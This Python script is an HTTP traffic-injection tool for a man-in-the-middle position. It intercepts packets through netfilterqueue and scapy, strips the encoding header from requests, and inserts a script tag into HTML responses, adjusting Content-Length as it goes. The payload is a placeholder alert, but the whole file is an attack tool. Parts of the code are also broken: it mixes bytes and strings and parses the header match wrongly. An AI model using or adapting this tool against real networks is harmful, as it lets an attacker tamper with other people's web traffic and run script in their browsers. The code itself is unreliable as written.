#!/usr/bin/env python3
import netfilterqueue
import re
from scapy.layers.inet import IP
from scapy.layers.http import Raw, TCP


def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
        try:
            load = scapy_packet[Raw].load.decode()
            if scapy_packet[TCP].dport == 80:  # dport is incoming
                print("HTTP Request")
                # Replacing encoding to see raw html.
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[TCP].sport == 80:  # sport is outgoing
                print("HTTP Response")
                injection_code = "<script>alert('test');</script>"
                load = scapy_packet[Raw].load.replace("</body>", f"{injection_code}</body>")
                content_length_search = re.search(r"Content-Length:\s(\d*)", load)
                # Modify content length on return to insure our code isn't cutoff from running.
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(0)  # First match just the digits.
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            if load != scapy_packet[Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:  # We don't care about packets we can't unicode decode.
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Connect our queue to the iptables command queue_num.
queue.run()
